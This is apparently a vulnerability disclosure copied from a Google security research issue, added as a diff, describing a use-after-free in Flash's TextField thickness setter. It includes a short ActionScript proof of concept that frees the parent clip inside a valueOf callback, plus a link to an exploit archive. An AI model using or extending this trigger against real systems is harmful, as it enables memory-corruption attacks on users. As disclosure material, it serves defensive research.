@@ -1,0 +1,32 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=587
+
+There is a use-after-free in the TextField thickness setter. If the thickness parameter is an object with valueOf set to a function which frees the TextField parent, it is used after it is freed.
+
+A minimal PoC is as follows:
+
+var times = 0;
+var mc = this.createEmptyMovieClip("mc", 101);
+var tf = mc.createTextField("tf", 102, 1, 1, 100, 100);
+tf.thickness = {valueOf : func};
+
+function func(){
+   
+        if(times == 0){
+          times++;
+          return 0;
+        }
+
+	mc.removeMovieClip();
+
+        // Fix heap here
+
+	return 0;
+	
+	}
+
+A sample swf and fla are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39045.zip
+
